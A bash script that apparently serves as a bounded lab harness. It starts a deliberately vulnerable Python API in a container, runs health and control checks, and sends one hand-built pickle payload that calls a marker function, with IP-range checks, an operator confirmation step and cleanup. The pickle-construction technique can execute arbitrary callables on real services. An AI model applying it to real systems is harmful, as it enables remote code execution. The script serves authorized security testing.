#!/usr/bin/env bash
# Operator-run bounded unsafe-deserialization marker proof for authorized local lab only.
# Run manually from <attacker-vm>. Do not use against public/unknown targets.
set -Eeuo pipefail

MODE="run"
CLEANUP_ON_EXIT="${CLEANUP_ON_EXIT:-1}"
for arg in "$@"; do
  case "$arg" in
    --precheck-only) MODE="precheck" ;;
    --no-cleanup) CLEANUP_ON_EXIT="0" ;;
    -h|--help)
      cat <<'HELP'
Usage: bash scripts/labs/operator_deser_bounded_marker_run.sh [--precheck-only] [--no-cleanup]

Modes:
  default          Start target, run health + invalid control, ask for manual confirmation, then send exactly one bounded pickle marker trigger.
  --precheck-only Start target and run non-triggering checks only; no pickle trigger is sent.
  --no-cleanup    Leave victim container running for debugging. Default cleans target on exit.

Local-lab only. The positive payload calls the lab-only record_deser_marker(marker) sink.
No shell, no arbitrary command, no persistence, no callback, no credential access.
HELP
      exit 0
      ;;
    *) echo "Unknown argument: $arg" >&2; exit 2 ;;
  esac
done

ATTACKER_IP="${ATTACKER_IP:-<lab-ip>}"
VICTIM_IP="${VICTIM_IP:-<lab-ip>}"
TARGET_PORT="${TARGET_PORT:-18082}"
RUN_ID="${RUN_ID:-modern_api_deser_operator_$(date -u +%Y%m%dT%H%M%SZ)}"
PROJECT_ROOT="${PROJECT_ROOT:-/mnt/hacking}"
VICTIM_SSH_USER="${VICTIM_SSH_USER:-kali}"
SSH_KEY="${SSH_KEY:-$PROJECT_ROOT/setting/local/ssh/kali_codex_ed25519}"
KNOWN_HOSTS="${KNOWN_HOSTS:-$PROJECT_ROOT/setting/local/ssh/known_hosts}"
SSH_CFG="${SSH_CFG:-$PROJECT_ROOT/setting/local/ssh/empty_ssh_config}"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
TARGET_URL="http://${VICTIM_IP}:${TARGET_PORT}"
MARKER="DESER_OPERATOR_${RUN_ID}"
CONTAINER="modern-api-deser-${TARGET_PORT}"

mkdir -p "$OUT/http" "$OUT/payload" "$OUT/cleanup" "$OUT/diagnostics"

log(){ printf '[%s] %s\n' "$(date -u +%H:%M:%SZ)" "$*" | tee -a "$OUT/run.log"; }
fail(){ log "ERROR: $*"; collect_diagnostics || true; exit 1; }

require_local_lab_values(){
  [[ "$ATTACKER_IP" == 192.168.56.* ]] || fail "ATTACKER_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$VICTIM_IP" == 192.168.56.* ]] || fail "VICTIM_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$TARGET_URL" == http://192.168.56.* ]] || fail "TARGET_URL must target host-only local lab IP"
}

ssh_victim(){
  ssh -F "$SSH_CFG" -i "$SSH_KEY" -p 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new \
    "${VICTIM_SSH_USER}@${VICTIM_IP}" "$@"
}

scp_to_victim(){
  scp -F "$SSH_CFG" -i "$SSH_KEY" -P 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new "$@"
}

internet_state(){
  if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then
    echo internet_open
  else
    echo internet_closed
  fi
}

collect_diagnostics(){
  set +e
  log "collecting diagnostics"
  ss -ltnp > "$OUT/diagnostics/attacker_ss_ltnp.txt" 2>&1
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics; docker ps -a > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_docker_ps_a.txt 2>&1; ss -ltnp > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_ss_ltnp.txt 2>&1; docker logs --tail 120 $CONTAINER > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_target_logs.txt 2>&1 || true; ip -4 -br addr > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_ip_addr.txt 2>&1" >/dev/null 2>&1 || true
}

cleanup(){
  set +e
  if [[ "$CLEANUP_ON_EXIT" != "1" ]]; then
    log "cleanup skipped because CLEANUP_ON_EXIT=$CLEANUP_ON_EXIT"
    return 0
  fi
  log "cleanup: removing victim target container $CONTAINER"
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/cleanup; docker rm -f $CONTAINER > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/target_cleanup.txt 2>&1 || true; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; else echo internet_closed > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; fi" >/dev/null 2>&1
  internet_state > "$OUT/cleanup/attacker_internet.txt"
  log "cleanup complete; attacker internet: $(cat "$OUT/cleanup/attacker_internet.txt" 2>/dev/null || echo unknown)"
}
trap cleanup EXIT

wait_for_attacker_health(){
  local i code
  for i in $(seq 1 25); do
    code=$(curl -sS -m 2 -o "$OUT/http/pre_health_attempt_${i}.json" -w '%{http_code}' "$TARGET_URL/health" 2>"$OUT/http/pre_health_attempt_${i}.err" || echo 000)
    printf '[%s] pre_health_attempt_%s=%s\n' "$(date -u +%H:%M:%SZ)" "$i" "$code" | tee -a "$OUT/run.log" >&2
    if [[ "$code" == "200" ]]; then
      cp "$OUT/http/pre_health_attempt_${i}.json" "$OUT/http/pre_health.json"
      echo 200
      return 0
    fi
    sleep 1
  done
  echo 000
  return 1
}

wait_for_victim_local_health(){
  ssh_victim "for i in \$(seq 1 20); do code=\$(curl -sS -m 2 -o \$HOME/<artifact-output-dir>/$RUN_ID/http/victim_local_health_attempt_\${i}.json -w '%{http_code}' http://127.0.0.1:${TARGET_PORT}/health 2>\$HOME/<artifact-output-dir>/$RUN_ID/http/victim_local_health_attempt_\${i}.err || echo 000); echo victim_local_health_attempt_\${i}=\$code; if [ \"\$code\" = 200 ]; then exit 0; fi; sleep 1; done; exit 1"
}

require_local_lab_values

log "RUN_ID=$RUN_ID"
log "MODE=$MODE CLEANUP_ON_EXIT=$CLEANUP_ON_EXIT"
log "OUT=$OUT"
log "ATTACKER_IP=$ATTACKER_IP VICTIM_IP=$VICTIM_IP"
log "TARGET_URL=$TARGET_URL"
log "MARKER=$MARKER"

[[ -d "$PROJECT_ROOT" ]] || fail "PROJECT_ROOT not found: $PROJECT_ROOT"
[[ -f "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" ]] || fail "missing target source"
[[ -f "$SSH_KEY" ]] || fail "missing SSH key: $SSH_KEY"
command -v curl >/dev/null || fail "curl missing"
command -v python3 >/dev/null || fail "python3 missing"

log "checking attacker/victim Internet posture"
internet_state | tee "$OUT/attacker_internet_pre.txt"
ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/http; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open; else echo internet_closed; fi" | tee "$OUT/victim_internet_pre.txt"

log "copying and starting victim target"
ssh_victim "mkdir -p /home/kali/hermes-labs/modern_vuln_api \$HOME/<artifact-output-dir>/$RUN_ID/http \$HOME/<artifact-output-dir>/$RUN_ID/cleanup \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics"
scp_to_victim "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" "${VICTIM_SSH_USER}@${VICTIM_IP}:/home/kali/hermes-labs/modern_vuln_api/modern_vuln_api.py"
ssh_victim "docker rm -f $CONTAINER >/dev/null 2>&1 || true; docker run -d --name $CONTAINER -p 0.0.0.0:${TARGET_PORT}:${TARGET_PORT} -v /home/kali/hermes-labs/modern_vuln_api:/app:ro python:3-alpine python /app/modern_vuln_api.py --host 0.0.0.0 --port ${TARGET_PORT}; docker ps | grep $CONTAINER" | tee "$OUT/http/victim_target_start.txt"

log "waiting for victim local health"
wait_for_victim_local_health | tee "$OUT/http/victim_local_health_wait.txt" || fail "victim local health failed"

log "waiting for attacker-to-victim pre-health"
PRE_CODE=$(wait_for_attacker_health || true)
log "pre_health=$PRE_CODE"
[[ "$PRE_CODE" == "200" ]] || fail "attacker-to-victim pre-health failed"

log "sending invalid/control deserialize request"
CONTROL_JSON="$OUT/payload/invalid_control.json"
printf '{"payload_b64":"not-valid-base64"}\n' > "$CONTROL_JSON"
CONTROL_CODE=$(curl -sS --max-time 8 -o "$OUT/http/deserialize_invalid_control.json" -w '%{http_code}' -H 'Content-Type: application/json' --data-binary "@$CONTROL_JSON" "$TARGET_URL/deserialize" || echo 000)
log "invalid_control_status=$CONTROL_CODE"
if [[ "$CONTROL_CODE" != "400" ]]; then
  fail "invalid control did not return expected 400"
fi

LOG_CODE_PRE=$(curl -sS --max-time 8 -o "$OUT/http/deser_log_pre.json" -w '%{http_code}' "$TARGET_URL/deser-log" || echo 000)
log "deser_log_pre_status=$LOG_CODE_PRE"

if [[ "$MODE" == "precheck" ]]; then
  cat > "$OUT/summary.md" <<EOF
# Deserialization operator precheck only

run_id: $RUN_ID
mode: precheck-only
target: $TARGET_URL
pre_health: $PRE_CODE
invalid_control_status: $CONTROL_CODE
deser_log_pre_status: $LOG_CODE_PRE
verdict: setup_ready_no_pickle_trigger_sent
EOF
  log "PRECHECK_ONLY complete: no pickle trigger sent"
  log "summary=$OUT/summary.md"
  exit 0
fi

PAYLOAD_JSON="$OUT/payload/deser_marker_payload.json"
python3 - "$PAYLOAD_JSON" "$MARKER" <<'PY'
import base64, json, sys
out, marker = sys.argv[1:3]
# Protocol-0 pickle: call __main__.record_deser_marker(marker) on the lab server.
# Lab-only bounded sink: no shell, no arbitrary command, no persistence, no callback, no credential access.
raw = b"c__main__\nrecord_deser_marker\n(" + ("V" + marker + "\n").encode() + b"tR."
open(out, "w", encoding="utf-8").write(json.dumps({"payload_b64": base64.b64encode(raw).decode(), "marker": marker}, indent=2))
PY

cat <<EOF | tee "$OUT/operator_confirmation.txt"

About to send EXACTLY ONE bounded unsafe-deserialization marker trigger to the local lab target:

  POST $TARGET_URL/deserialize
  marker: $MARKER

Boundaries:
- local lab only
- one positive pickle trigger request
- payload calls record_deser_marker(marker) only
- no shell, no arbitrary command, no persistence, no callback, no credential access
- no public/unknown target

EOF

printf 'Type RUN_DESER_MARKER_ON_LOCAL_LAB to execute the one trigger: '
read -r CONFIRM
if [[ "$CONFIRM" != "RUN_DESER_MARKER_ON_LOCAL_LAB" ]]; then
  fail "operator did not confirm trigger"
fi

log "sending exactly one bounded deserialization marker trigger"
DESER_CODE=$(curl -sS --max-time 8 -o "$OUT/http/deserialize_marker_response.json" -w '%{http_code}' -H 'Content-Type: application/json' --data-binary "@$PAYLOAD_JSON" "$TARGET_URL/deserialize" || echo 000)
log "deserialize_marker_status=$DESER_CODE"

LOG_CODE_POST=$(curl -sS --max-time 8 -o "$OUT/http/deser_log_post.json" -w '%{http_code}' "$TARGET_URL/deser-log" || echo 000)
log "deser_log_post_status=$LOG_CODE_POST"

POST_CODE=$(curl -sS -m 5 -o "$OUT/http/post_health.json" -w '%{http_code}' "$TARGET_URL/health" || echo 000)
log "post_health=$POST_CODE"

MARKER_FOUND=no
if grep -q "$MARKER" "$OUT/http/deserialize_marker_response.json" 2>/dev/null || grep -q "$MARKER" "$OUT/http/deser_log_post.json" 2>/dev/null; then
  MARKER_FOUND=yes
fi

cat > "$OUT/summary.md" <<EOF
# Deserialization bounded-marker operator run

run_id: $RUN_ID
target: $TARGET_URL
marker: $MARKER
pre_health: $PRE_CODE
invalid_control_status: $CONTROL_CODE
deserialize_marker_status: $DESER_CODE
deser_log_pre_status: $LOG_CODE_PRE
deser_log_post_status: $LOG_CODE_POST
post_health: $POST_CODE
marker_found: $MARKER_FOUND

## Boundary

Local authorized lab only. Exactly one bounded pickle marker trigger. No shell, arbitrary command, persistence, callback, credential access, public target, or exfiltration.

## Key artifacts

- http/pre_health.json
- http/deserialize_invalid_control.json
- payload/deser_marker_payload.json
- http/deserialize_marker_response.json
- http/deser_log_post.json
- http/post_health.json
- cleanup/
EOF

log "marker_found=$MARKER_FOUND"
log "summary=$OUT/summary.md"

if [[ "$PRE_CODE" == "200" && "$CONTROL_CODE" == "400" && "$DESER_CODE" == "200" && "$LOG_CODE_POST" == "200" && "$POST_CODE" == "200" && "$MARKER_FOUND" == "yes" ]]; then
  log "VERDICT=verified_bounded_marker_lab_only"
else
  log "VERDICT=attempted_not_verified"
fi

log "Script completed. Cleanup will run automatically now. Pull $OUT back to Windows afterward if needed."
